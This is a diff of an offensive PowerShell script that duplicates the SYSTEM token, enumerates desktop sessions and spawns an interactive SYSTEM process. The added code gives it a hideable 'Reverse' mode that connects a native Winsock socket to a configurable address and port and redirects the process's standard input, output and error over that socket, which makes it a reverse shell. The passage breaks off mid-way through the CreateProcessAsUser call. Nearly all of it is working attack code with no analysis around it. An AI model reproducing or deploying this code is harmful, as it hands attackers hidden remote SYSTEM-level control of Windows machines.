@@ -1,240 +1,163 @@
-<#-------------------------------------------------------------------------------
+# ----------------------------------------------------------------------------------- #
+#                                                                                     #
+#    .Developer                                                                       #
+#        Jean-Pierre LESUEUR (@DarkCoderSc)                                           #
+#        https://www.twitter.com/darkcodersc                                          #
+#        https://github.com/PhrozenIO                                                 #
+#        https://github.com/DarkCoderSc                                               #
+#        www.phrozen.io                                                               #
+#        jplesueur@phrozen.io                                                         #
+#        PHROZEN                                                                      #
+#    .License                                                                         #
+#        Apache License                                                               #
+#        Version 2.0, January 2004                                                    #
+#        http://www.apache.org/licenses/                                              #
+#    .Disclaimer                                                                      #
+#        This script is provided "as is", without warranty of any kind, express or    #
+#        implied, including but not limited to the warranties of merchantability,     #
+#        fitness for a particular purpose and noninfringement. In no event shall the  #
+#        authors or copyright holders be liable for any claim, damages or other       #
+#        liability, whether in an action of contract, tort or otherwise, arising      #
+#        from, out of or in connection with the software or the use or other dealings #
+#        in the software.                                                             #
+#                                                                                     #
+# ----------------------------------------------------------------------------------- #
 
-    .Developer
-        Jean-Pierre LESUEUR (@DarkCoderSc)
-        https://www.twitter.com/darkcodersc
-        https://github.com/DarkCoderSc
-        www.phrozen.io
-        jplesueur@phrozen.io
-        PHROZEN
-    .License
-        Apache License
-        Version 2.0, January 2004
-        http://www.apache.org/licenses/
-    .Disclaimer
-        We are doing our best to prepare the content of this app. However, PHROZEN SASU and / or
-        Jean-Pierre LESUEUR cannot warranty the expressions and suggestions of the contents,
-        as well as its accuracy. In addition, to the extent permitted by the law, 
-        PHROZEN SASU and / or Jean-Pierre LESUEUR shall not be responsible for any losses
-        and/or damages due to the usage of the information on our app.
-        By using our app, you hereby consent to our disclaimer and agree to its terms.
-        Any links contained in our app may lead to external sites are provided for
-        convenience only. Any information or statements that appeared in these sites
-        or app are not sponsored, endorsed, or otherwise approved by PHROZEN SASU and / or
-        Jean-Pierre LESUEUR. For these external sites, PHROZEN SASU and / or Jean-Pierre LESUEUR
-        cannot be held liable for the availability of, or the content located on or through it.
-        Plus, any losses or damages occurred from using these contents or the internet
-        generally.
-        
-    .Ideas
-        - Capture SYSTEM Process Stdin and Stdout/err in current session.
+# ----------------------------------------------------------------------------------- #
+#                           - STRUCTURES MEMORY MAPS -                                #
+# ----------------------------------------------------------------------------------- #
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
+# ----------------------------------------------------------------------------------- #
+# Field               | Type       | Size x32 | Offset x32 | Size x64 | Offset x64    #
+# ----------------------------------------------------------------------------------- #
+# PROCESS_INFORMATION                                                                 #
+# ----------------------------------------------------------------------------------- #
+# hProcess            | HANDLE     | 0x4      | 0x0        | 0x8      | 0x0           #
+# hThread             | HANDLE     | 0x4      | 0x4        | 0x8      | 0x8           #
+# dwProcessId         | DWORD      | 0x4      | 0x8        | 0x4      | 0x10          #
+# dwThreadId          | DWORD      | 0x4      | 0xC        | 0x4      | 0x14          #
+# ----------------------------------------------------------------------------------- #
+# Total Size x32: 0x10 (16 Bytes)      |     Total Size x64: 0x18 (24 Bytes)          #
+# ----------------------------------------------------------------------------------- #
+# STARTUPINFOW                                                                        #
+# ----------------------------------------------------------------------------------- #
+# cb                  | DWORD      | 0x4      | 0x0        | 0x4      | 0x0           #
+# lpReserved          | LPWSTR     | 0x4      | 0x4        | 0x8      | 0x8           #
+# lpDesktop           | LPWSTR     | 0x4      | 0x8        | 0x8      | 0x10          #
+# lpTitle             | LPWSTR     | 0x4      | 0xC        | 0x8      | 0x18          #
+# dwX                 | DWORD      | 0x4      | 0x10       | 0x4      | 0x20          #
+# dwY                 | DWORD      | 0x4      | 0x14       | 0x4      | 0x24          #
+# dwXSize             | DWORD      | 0x4      | 0x18       | 0x4      | 0x28          #
+# dwYSize             | DWORD      | 0x4      | 0x1C       | 0x4      | 0x2C          #
+# dwXCountChars       | DWORD      | 0x4      | 0x20       | 0x4      | 0x30          #
+# dwYCountChars       | DWORD      | 0x4      | 0x24       | 0x4      | 0x34          #
+# dwFillAttribute     | DWORD      | 0x4      | 0x28       | 0x4      | 0x38          #
+# dwFlags             | DWORD      | 0x4      | 0x2C       | 0x4      | 0x3C          #
+# wShowWindow         | WORD       | 0x2      | 0x30       | 0x2      | 0x40          #
+# cbReserved2         | WORD       | 0x2      | 0x32       | 0x2      | 0x42          #
+# lpReserved2         | LPBYTE     | 0x4      | 0x34       | 0x8      | 0x48          #
+# hStdInput           | HANDLE     | 0x4      | 0x38       | 0x8      | 0x50          #
+# hStdOutput          | HANDLE     | 0x4      | 0x3C       | 0x8      | 0x58          #
+# hStdError           | HANDLE     | 0x4      | 0x40       | 0x8      | 0x60          #
+# ----------------------------------------------------------------------------------- #
+# Total Size x32: 0x44 (68 Bytes)      |     Total Size x64: 0x68 (104 Bytes)         #
+# ----------------------------------------------------------------------------------- #
+# WTS_SESSION_INFOW                                                                   #
+# ----------------------------------------------------------------------------------- #
+# SessionId           | DWORD       | 0x4      | 0x0        | 0x4      | 0x0          #
+# pWinStationName     | LPSTR       | 0x4      | 0x4        | 0x8      | 0x8          #
+# State               | WTS_C_STATE | 0x1      | 0x8        | 0x1      | 0x10         #
+# ----------------------------------------------------------------------------------- #
+# Total Size x32: 0xC (12 Bytes)       |    Total Size x64: 0x18 (24 Bytes)           #
+# ----------------------------------------------------------------------------------- #
+# TokenPrivilege Structure                                                            #
+# ----------------------------------------------------------------------------------- #
+# PrivilegeCount     | UInt32       | 0x4      | 0x0        | 0x4      | 0x0          #
+# Luid               | Int64 (long) | 0x8      | 0x4        | 0x8      | 0x8          #
+# Attributes         | UInt32       | 0x4      | 0xC        | 0x4      | 0x10         #
+# ----------------------------------------------------------------------------------- #
+# Total Size x32: 0x10 (16 Bytes)       | Total Size x64: 0x18 (24 Bytes)             #
+# ----------------------------------------------------------------------------------- #
 
--------------------------------------------------------------------------------#>
 
-<#
-    --------------------------
-    - STRUCTURES MEMORY MAPS -
-    --------------------------
-
-    typedef struct _WTS_SESSION_INFOA {                               
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x0
-        // x86-64: 0x4 Bytes | Padding = 0x4 | Offset: 0x0  
-        DWORD SessionId; 
-        
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x4
-        // x86-64: 0x8 Bytes | Padding = 0x0 | Offset: 0x8
-        LPSTR pWinStationName;
-
-        // x86-32: 0x1 Bytes | Padding = 0x3 | Offset: 0x8
-        // x86-64: 0x1 Bytes | Padding = 0x7 | Offset: 0x10
-        WTS_CONNECTSTATE_CLASS State;          
-    } WTS_SESSION_INFOA, *PWTS_SESSION_INFOA;
-
-    // x86-32 Struct Size: 0x4(+0x0) + 0x4(+0x0) + 0x1(+0x3) = 0xc (12 Bytes)
-    // x86-64 Struct Size: 0x4(+0x4) + 0x8(+0x0) + 0x1(+0x7) = 0x18 (24 Bytes)
-
-    ---
-
-    typedef struct _STARTUPINFOW {
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x0
-        // x86-64: 0x4 Bytes | Padding = 0x4 | Offset: 0x0
-        DWORD  cb;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x4
-        // x86-64: 0x8 Bytes | Padding = 0x0 | Offset: 0x8
-        LPWSTR lpReserved;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x8
-        // x86-64: 0x8 Bytes | Padding = 0x0 | Offset: 0x10
-        LPWSTR lpDesktop;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0xC
-        // x86-64: 0x8 Bytes | Padding = 0x0 | Offset: 0x18
-        LPWSTR lpTitle;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x10
-        // x86-64: 0x4 Bytes | Padding = 0x0 | Offset: 0x20
-        DWORD  dwX;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x14
-        // x86-64: 0x4 Bytes | Padding = 0x0 | Offset: 0x24
-        DWORD  dwY;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x18
-        // x86-64: 0x4 Bytes | Padding = 0x0 | Offset: 0x28
-        DWORD  dwXSize;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x1C
-        // x86-64: 0x4 Bytes | Padding = 0x0 | Offset: 0x2C
-        DWORD  dwYSize;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x20
-        // x86-64: 0x4 Bytes | Padding = 0x0 | Offset: 0x30
-        DWORD  dwXCountChars;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x24
-        // x86-64: 0x4 Bytes | Padding = 0x0 | Offset: 0x34
-        DWORD  dwYCountChars;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x28
-        // x86-64: 0x4 Bytes | Padding = 0x0 | Offset: 0x38
-        DWORD  dwFillAttribute;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x2C
-        // x86-64: 0x4 Bytes | Padding = 0x0 | Offset: 0x3C
-        DWORD  dwFlags;
-
-        // x86-32: 0x2 Bytes | Padding = 0x0 | Offset: 0x30
-        // x86-64: 0x2 Bytes | Padding = 0x0 | Offset: 0x40
-        WORD   wShowWindow;
-
-        // x86-32: 0x2 Bytes | Padding = 0x0 | Offset: 0x32
-        // x86-64: 0x2 Bytes | Padding = 0x4 | Offset: 0x42
-        WORD   cbReserved2;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x34
-        // x86-64: 0x8 Bytes | Padding = 0x0 | Offset: 0x48
-        LPBYTE lpReserved2;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x38
-        // x86-64: 0x8 Bytes | Padding = 0x0 | Offset: 0x50
-        HANDLE hStdInput;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x3C
-        // x86-64: 0x8 Bytes | Padding = 0x0 | Offset: 0x58
-        HANDLE hStdOutput;
-
-        // x86-32: 0x4 Bytes | Padding = 0x0 | Offset: 0x40
-        // x86-64: 0x8 Bytes | Padding = 0x0 | Offset: 0x60
-        HANDLE hStdError;
-    } STARTUPINFOW, *LPSTARTUPINFOW;
-
-    // x86-32 Struct Size: 0x44 (68 Bytes)
-    // x86-64 Struct Size: 0x68 (104 Bytes)            
-#>
+# ----------------------------------------------------------------------------------- #
+#                                                                                     #
+#                                                                                     #
+#                                                                                     #
+#  Windows API Definitions                                                            #
+#                                                                                     #
+#                                                                                     #
+#                                                                                     #
+# ----------------------------------------------------------------------------------- #
 
 Add-Type @"
-    using System;    
+    using System;
     using System.Security;
     using System.Runtime.InteropServices;
-
-    [StructLayout(LayoutKind.Sequential, Pack = 1)]
-    public struct TokenPrivilege
-    {
-        public UInt32 PrivilegeCount;
-        public long Luid;
-        public UInt32 Attributes;
-    }
 
     public static class ADVAPI32
     {
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool LookupPrivilegeValue(
-            IntPtr lpSystemName, 
+            IntPtr lpSystemName,
             string lpName,
             ref long lpLuid
         );
 
-        [DllImport("advapi32.dll", SetLastError=true)]            
+        [DllImport("advapi32.dll", SetLastError=true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool AdjustTokenPrivileges(
-            IntPtr TokenHandle, 
-            bool DisableAllPrivileges, 
-            ref TokenPrivilege NewState, 
+            IntPtr TokenHandle,
+            bool DisableAllPrivileges,
+            IntPtr NewState,
             UInt32 BufferLengthInBytes,
-            IntPtr PreviousState, 
+            IntPtr PreviousState,
             IntPtr ReturnLengthInBytes
-        );    
+        );
 
-        [DllImport("advapi32.dll", SetLastError = true)]        
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool ImpersonateNamedPipeClient(
             IntPtr hNamedPipe
         );
 
-        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        public static extern bool CreateProcessWithToken(
-            IntPtr hToken,
-            UInt32 dwLogonFlags,
-            IntPtr lpApplicationName,
-            string lpCommandLine,            
-            uint dwCreationFlags,
-            IntPtr lpEnvironment,
-            IntPtr lpCurrentDirectory,
-            IntPtr lpStartupInfo,
-            ref IntPtr lpProcessInformation
-        );
-
-        [DllImport("advapi32.dll", SetLastError = true)]  
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool RevertToSelf();
     }
-"@ 
 
-class WinAPIException: System.Exception {
-    WinAPIException([string] $ApiName) : base (
-        [string]::Format(
-            "WinApi Exception -> {0}, LastError: {1}",
-            $ApiName,
-            [System.Runtime.InteropServices.Marshal]::GetLastWin32Error().ToString()
-        )
-    ) 
-    {}
-}
+    public static class Kernel32
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool CloseHandle(IntPtr handle);
+    }
+"@
 
-function Test-Impersonating
-{
-    <#
-        .SYNOPSIS
-            Check whether or not current thread is impersonating another user.
-    #>
-    return ([System.Security.Principal.WindowsIdentity]::GetCurrent().ImpersonationLevel -eq [System.Management.ImpersonationLevel]::Impersonate)
-}
+# ----------------------------------------------------------------------------------- #
+#                                                                                     #
+#                                                                                     #
+#                                                                                     #
+#  Spawn Interactive System Process Script Block                                      #
+#  (Stager)                                                                           #
+#                                                                                     #
+#                                                                                     #
+# ----------------------------------------------------------------------------------- #
 
-$global:InvokeInteractiveProcessScriptBlock = {
+$InvokeInteractiveProcess_ScriptBlock = {
     Add-Type @"
-        using System;    
+        using System;
         using System.Security;
         using System.Runtime.InteropServices;
-
-        public static class WTSAPI32 
-        {    
-            [DllImport("wtsapi32.dll", SetLastError = true)]
-            public static extern bool WTSEnumerateSessions(
-                IntPtr hServer,
-                UInt32 Reserved,
-                UInt32 Version,
-                ref IntPtr ppSessionInfo,
-                ref UInt32 pCount
-            );
-
-            [DllImport("wtsapi32.dll")]
-            public static extern void WTSFreeMemory(IntPtr pMemory);
-        }    
 
         public static class ADVAPI32
         {
             [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+            [return: MarshalAs(UnmanagedType.Bool)]
             public static extern bool CreateProcessAsUser(
                 IntPtr hToken,
-                string lpApplicationName,
+                IntPtr lpApplicationName,
                 string lpCommandLine,
                 IntPtr lpProcessAttributes,
                 IntPtr lpThreadAttributes,
@@ -243,10 +166,11 @@ $global:InvokeInteractiveProcessScriptBlock = {
                 IntPtr lpEnvironment,
                 IntPtr lpCurrentDirectory,
                 IntPtr lpStartupInfo,
-                ref IntPtr lpProcessInformation
+                IntPtr lpProcessInformation
             );
 
-            [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+            [DllImport("advapi32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
             public static extern bool DuplicateTokenEx(
                 IntPtr hExistingToken,
                 uint dwDesiredAccess,
@@ -257,6 +181,7 @@ $global:InvokeInteractiveProcessScriptBlock = {
             );
 
             [DllImport("advapi32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
             public static extern bool SetTokenInformation(
                 IntPtr TokenHandle,
                 byte TokenInformationClass,
@@ -268,57 +193,108 @@ $global:InvokeInteractiveProcessScriptBlock = {
         public static class Kernel32
         {
             [DllImport("kernel32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
             public static extern bool CloseHandle(IntPtr handle);
         }
-"@  
 
-    if (-not [Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
+        public static class WTSAPI32
+        {
+            [DllImport("wtsapi32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            public static extern bool WTSEnumerateSessions(
+                IntPtr hServer,
+                UInt32 Reserved,
+                UInt32 Version,
+                ref IntPtr ppSessionInfo,
+                ref UInt32 pCount
+            );
+
+            [DllImport("Ws2_32.dll", SetLastError = true)]
+            public static extern int WSAStartup(ushort wVersionRequested, IntPtr lpWSAData);
+
+            [DllImport("wtsapi32.dll")]
+            public static extern void WTSFreeMemory(IntPtr pMemory);
+        }
+
+        public static class WS232
+        {
+            [DllImport("Ws2_32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.I4)]
+            public static extern int WSAStartup(
+                ushort wVersionRequested,
+                IntPtr lpWSAData
+            );
+
+            [DllImport("Ws2_32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.I4)]
+            public static extern int WSACleanup();
+
+            [DllImport("ws2_32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+            public static extern IntPtr WSASocket(
+                int af,
+                int type,
+                int protocol,
+                IntPtr lpProtocolInfo,
+                int g,
+                int dwFlags
+            );
+
+            [DllImport("ws2_32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.I4)]
+            public static extern int WSAConnect(
+                IntPtr s,
+                IntPtr name,
+                int namelen,
+                IntPtr lpCallerData,
+                IntPtr lpCalleeData,
+                IntPtr lpSQOS,
+                IntPtr lpGQOS
+            );
+
+            [DllImport("ws2_32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.I4)]
+            public static extern int closesocket(IntPtr s);
+        }
+"@
+
+    function Get-ActiveDesktopSessionId
     {
-        throw "You must be system user to run an interactive system process."
-    }
+        $activeSessionId = 0xFFFFFFFF
 
-    # Get Active Session Id
+        $pSessionArray = [IntPtr]::Zero
+        $sessionCount = 0
 
-    [IntPtr] $pSessionArray = [IntPtr]::Zero
-    [UInt32] $sessionCount = 0
-
-    try
-    {
         if (-not [WTSAPI32]::WTSEnumerateSessions([IntPtr]::Zero, 0, 1, [ref]$pSessionArray, [ref]$sessionCount))
         {
-            throw "Could not enumerate sessions."
+            throw [WinAPIException]::New("WTSEnumerateSessions")
         }
         try
-        {                    
-            #$structSize = [Runtime.InteropServices.Marshal]::SizeOf([System.Type][WTS_SESSION_INFO])
+        {
             if ([Environment]::Is64BitProcess)
             {
-                $structSize = 0x18  
-                $structOffset_State = 0x10  
+                $structSize = 0x18
+                $structOffset_State = 0x10
             }
             else
             {
                 $structSize = 0xc
                 $structOffset_State = 0x8
             }
-                        
-            $activeSession = -1            
 
             for ($i = 0; $i -lt $sessionCount; $i++)
             {
-                [IntPtr] $pOffset = [IntPtr]([Int64]$pSessionArray + ($i * $structSize))
+                $pOffset = [IntPtr]([Int64]$pSessionArray + ($i * $structSize))
 
-                #$sessionInfo = [WTS_SESSION_INFO][Runtime.InteropServices.Marshal]::PtrToStructure($pOffset, [System.Type][WTS_SESSION_INFO]) 
                 $curSessionId = [System.Runtime.InteropServices.Marshal]::ReadInt32($pOffset, 0x0)
                 $curSessionState = [System.Runtime.InteropServices.Marshal]::ReadInt32($pOffset, $structOffset_State)
 
-                $WTSActive = 0
-                if ($curSessionState -eq $WTSActive)
-                {                      
-                    $activeSession = $curSessionId
+                $WTS_CONNECTSTATE_CLASS_WTSActive = 0
+                if ($curSessionState -eq $WTS_CONNECTSTATE_CLASS_WTSActive)
+                {
+                    $activeSessionId = $curSessionId
 
                     break
-                }                
+                }
             }
         }
         finally
@@ -329,138 +305,429 @@ $global:InvokeInteractiveProcessScriptBlock = {
             }
         }
 
-        if ($activeSession -eq -1)
+        return $activeSessionId
+    }
+
+    function Initialize-NativeSocket
+    {
+        $WSAData = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(408)
+        if ([WS232]::WSAStartup(0x2020, $WSAData))
         {
-            throw "Could not found active session."
+            throw [WinAPIException]::New("WSAStartup")
         }
 
-        # Create new system process in Active Session
+        return $WSAData
+    }
 
-        <#
-            $token = [IntPtr]::Zero
-            $ALL_ACCESS = 0xF01FF
+    function Clear-NativeSocket
+    {
+        $null = [WS232]::WSACleanup()
+    }
 
-            if (-not [ADVAPI32]::OpenProcessToken([Kernel32]::GetCurrentProcess(), $ALL_ACCESS, [ref]$token))
-            {
-                throw "OpenProcessToken"
-            }
-        #>
+    function New-NativeSocket
+    {
+        $AF_INET = 2
+        $SOCK_STREAM = 1
+        $IPPROTO_TCP = 6
 
-        $token = [Security.Principal.WindowsIdentity]::GetCurrent().Token
-        $newToken = [IntPtr]::Zero
-
-        $MAXIMUM_ALLOWED = 0x02000000
-        $SecurityIdentification = 0x2
-        $TokenPrimary = 0x1
-
-        if (-not [ADVAPI32]::DuplicateTokenEx($token, $MAXIMUM_ALLOWED, [IntPtr]::Zero, $SecurityIdentification, $TokenPrimary, [ref]$newToken))
+        $socket = [WS232]::WSASocket($AF_INET, $SOCK_STREAM, $IPPROTO_TCP, [IntPtr]::Zero, 0, 0)
+        if ($socket -eq [IntPtr]::Zero)
         {
-            throw "Could not duplicate token."
-        }    
-
-        $TokenSessionId = 0xc
-
-        if (-not [ADVAPI32]::SetTokenInformation($newToken, $TokenSessionId, [ref]$activeSession, [UInt32][Runtime.InteropServices.Marshal]::SizeOf($activeSession)))
-        {
-            throw "Could not set token information."
+            throw [WinAPIException]::New("WSASocket")
         }
 
-        $STARTF_USESHOWWINDOW = 0x1
-        $SW_SHOW = 0x5
-    
-        if ([Environment]::Is64BitProcess)
+        return $socket
+    }
+
+    function Close-NativeSocket
+    {
+        param (
+            [IntPtr] $Socket
+        )
+
+        if ([int]$Socket -le 0)
         {
-            $structSize = 0x68
-            $structOffset_dwFlags = 0x3c
-            $structOffset_wShowWindow = 0x40
-        }
-        else
-        {
-            $structSize = 0x44
-            $structOffset_dwFlags = 0x2c
-            $structOffset_wShowWindow = 0x30
+            return
         }
 
-        $pSTARTUPINFO = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($structSize)
+        if ([WS232]::closesocket($Socket))
+        {
+            throw [WinAPIException]::New("closesocket")
+        }
+
+    }
+
+    function Connect-NativeSocket
+    {
+        param (
+            [Parameter(Mandatory=$True)]
+            [string] $Address,
+
+            [Parameter(Mandatory=$True)]
+            [ValidateRange(1, 65535)]
+            [int] $Port
+        )
+
+        $sockAddrPtr = [IntPtr]::Zero
+        $socket = -1
         try
         {
-            # ZeroMemory
-            for ($i = 0; $i -lt $structSize; $i++)
+            $socket = New-NativeSocket
+
+            # This tiny hack is used to avoid defining by hand `SockAddr` native structure.
+            $ipEndPoint = [System.Net.IPEndPoint]::New(
+                [System.Net.IPAddress]::Parse($Address),
+                $Port
+            )
+
+            $sockAddr = $ipEndPoint.Serialize()
+
+            $sockAddrPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sockAddr.Size)
+
+            for ($i = 0; $i -lt $sockAddr.Size; $i++) {
+                [System.Runtime.InteropServices.Marshal]::WriteByte($sockAddrPtr, $i, $sockAddr[$i])
+            }
+
+            $result = [WS232]::WSAConnect(
+                $socket,
+                $sockAddrPtr,
+                $sockAddr.Size,
+                [IntPtr]::Zero,
+                [IntPtr]::Zero,
+                [IntPtr]::Zero,
+                [IntPtr]::Zero
+            )
+            if ($result -eq -1)
             {
-                [System.Runtime.InteropServices.Marshal]::WriteByte($pSTARTUPINFO, $i, 0x0)    
-            }                   
+                throw [WinAPIException]::New("WSAConnect")
+            }
+        }
+        catch
+        {
+            Close-NativeSocket -Socket $socket
 
-            [System.Runtime.InteropServices.Marshal]::WriteInt32($pSTARTUPINFO, 0x0, $structSize) # cb
-            [System.Runtime.InteropServices.Marshal]::WriteInt32($pSTARTUPINFO, $structOffset_dwFlags, $STARTF_USESHOWWINDOW) # dwFlags
-            [System.Runtime.InteropServices.Marshal]::WriteInt16($pSTARTUPINFO, $structOffset_wShowWindow, $SW_SHOW) # wShowWindow
-        
-            $processInfo = [IntPtr]::Zero
-
-            $CREATE_NEW_CONSOLE = 0x10
-
-            if (-not [ADVAPI32]::CreateProcessAsUser(
-                $newToken,
-                "cmd.exe",
-                "/c ""start powershell.exe""",
-                [IntPtr]::Zero,
-                [IntPtr]::Zero,
-                $false,
-                $CREATE_NEW_CONSOLE,
-                [IntPtr]::Zero,
-                [IntPtr]::Zero,
-                $pSTARTUPINFO,
-                [ref]$processInfo
-            ))
-            {
-                throw "Could not create process as user."
-            }  
+            $socket = -1
         }
         finally
         {
-            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pSTARTUPINFO)
+            if ($sockAddrPtr -ne [IntPtr]::Zero)
+            {
+                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($sockAddrPtr)
+            }
+        }
+
+        return $socket
+    }
+
+    function Invoke-InteractiveSystemProcess
+    {
+        param(
+            [string] $CommandLine = "powershell.exe",
+            [switch] $Hide,
+
+            [ValidateSet("None", "Reverse")]
+            [string] $RedirectKind = "None",
+
+            [string] $Address = "127.0.0.1",
+
+            [ValidateRange(1, 65535)]
+            [int] $Port = 2801
+        )
+
+        if (-not [Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
+        {
+            return
+        }
+
+        $redirectFd = $false
+        if ($RedirectKind -eq "Reverse")
+        {
+            Initialize-NativeSocket
+
+            $socket = Connect-NativeSocket -Address $Address -Port $Port
+
+            $redirectFd = $true
+        }
+
+        $newToken = [IntPtr]::Zero
+        try
+        {
+            $token = [Security.Principal.WindowsIdentity]::GetCurrent().Token
+
+            $MAXIMUM_ALLOWED = 0x02000000
+            $SECURITY_IMPERSONATION_LEVEL_SecurityImpersonation = 0x2
+            $TOKEN_TYPE_TokenPrimary = 0x1
+
+            if (-not [ADVAPI32]::DuplicateTokenEx(
+                $token,
+                $MAXIMUM_ALLOWED,
+                [IntPtr]::Zero,
+                $SECURITY_IMPERSONATION_LEVEL_SecurityImpersonation,
+                $TOKEN_TYPE_TokenPrimary,
+                [ref]$newToken)
+            )
+            {
+                throw [WinAPIException]::New("DuplicateTokenEx")
+            }
+
+            $activeSessionId = Get-ActiveDesktopSessionId
+
+            $TOKEN_INFORMATION_CLASS_TokenSessionId = 0xc
+
+            if (-not [ADVAPI32]::SetTokenInformation(
+                $newToken,
+                $TOKEN_INFORMATION_CLASS_TokenSessionId,
+                [ref]$activeSessionId,
+                [Runtime.InteropServices.Marshal]::SizeOf($activeSessionId))
+            )
+            {
+                throw [WinAPIException]::New("SetTokenInformation")
+            }
+
+            $STARTF_USESTDHANDLES = 0x100
+            $STARTF_USESHOWWINDOW = 0x1
+            $SW_SHOW = 0x5
+            $SW_HIDE = 0x0
+
+            if ([Environment]::Is64BitProcess)
+            {
+                # STARTUP_INFO x64
+                $STARTUPINFO_structSize = 0x68
+                $STARTUPINFO_dwFlags = 0x3c
+                $STARTUPINFO_wShowWindow = 0x40
+                $STARTUPINFO_StdInput = 0x50
+                $STARTUPINFO_StdOutput = 0x58
+                $STARTUPINFO_StdError = 0x60
+
+                # PROCESS_INFORMATION x64
+                $PROCESS_INFORMATION_structSize = 0x18
+                $PROCESS_INFORMATION_dwProcessId = 0x10
+                $PROCESS_INFORMATION_hThread = 0x8
+            }
+            else
+            {
+                # STARTUP_INFO x32
+                $STARTUPINFO_structSize = 0x44
+                $STARTUPINFO_dwFlags = 0x2c
+                $STARTUPINFO_wShowWindow = 0x30
+                $STARTUPINFO_StdInput = 0x38
+                $STARTUPINFO_StdOutput = 0x3c
+                $STARTUPINFO_StdError = 0x40
+
+                # PROCESS_INFORMATION x32
+                $PROCESS_INFORMATION_structSize = 0x10
+                $PROCESS_INFORMATION_dwProcessId = 0x8
+                $PROCESS_INFORMATION_hThread = 0x4
+            }
+
+            $pSTARTUPINFO = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($STARTUPINFO_structSize)
+            $pPROCESS_INFORMATION = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PROCESS_INFORMATION_structSize)
+            try
+            {
+                Invoke-ZeroMemory -MemoryOffset $pSTARTUPINFO -Size $STARTUPINFO_structSize
+                Invoke-ZeroMemory -MemoryOffset $pPROCESS_INFORMATION -Size $PROCESS_INFORMATION_structSize
+
+                # STARTUPINFO Structure Initialization
+                [System.Runtime.InteropServices.Marshal]::WriteInt32(
+                    $pSTARTUPINFO,
+                    0x0,
+                    $STARTUPINFO_structSize
+                )
+
+                $dwFlags = $STARTF_USESHOWWINDOW
+                if ($redirectFd)
+                {
+                    $dwFlags = $dwFlags -bor $STARTF_USESTDHANDLES
+                }
+
+                [System.Runtime.InteropServices.Marshal]::WriteInt32(
+                    $pSTARTUPINFO,
+                    $STARTUPINFO_dwFlags,
+                    $dwFlags
+                )
+
+                [System.Runtime.InteropServices.Marshal]::WriteInt16(
+                    $pSTARTUPINFO,
+                    $STARTUPINFO_wShowWindow,
+                    $(if ($Hide) {$SW_HIDE} else {$SW_SHOW})
+                )
+
+                # Redirect Standard I/O
+                if ($redirectFd)
+                {
+                    [System.Runtime.InteropServices.Marshal]::WriteIntPtr(
+                        $pSTARTUPINFO,
+                        $STARTUPINFO_StdInput,
+                        $socket
+                    )
+
+                    [System.Runtime.InteropServices.Marshal]::WriteIntPtr(
+                        $pSTARTUPINFO,
+                        $STARTUPINFO_StdOutput,
+                        $socket
+                    )
+
+                    [System.Runtime.InteropServices.Marshal]::WriteIntPtr(
+                        $pSTARTUPINFO,
+                        $STARTUPINFO_StdError,
+                        $socket
+                    )
+                }
+
+                # Start new process as SYSTEM (Interactive Session)
+                $CREATE_NEW_CONSOLE = 0x10
+
+                if (-not [ADVAPI32]::CreateProcessAsUser(
+                    $newToken,
+                    [IntPtr]::Zero,
+                    $CommandLine,
+                    [IntPtr]::Zero,
+                    [IntPtr]::Zero,
+                    $(if ($redirectFd -eq $true) { $true } else { $false }),
+                    $CREATE_NEW_CONSOLE,
+                    [IntPtr]::Zero,
+                    [IntPtr]::Zero,
+                    $pSTARTUPINFO,
+                    $pPROCESS_INFORMATION
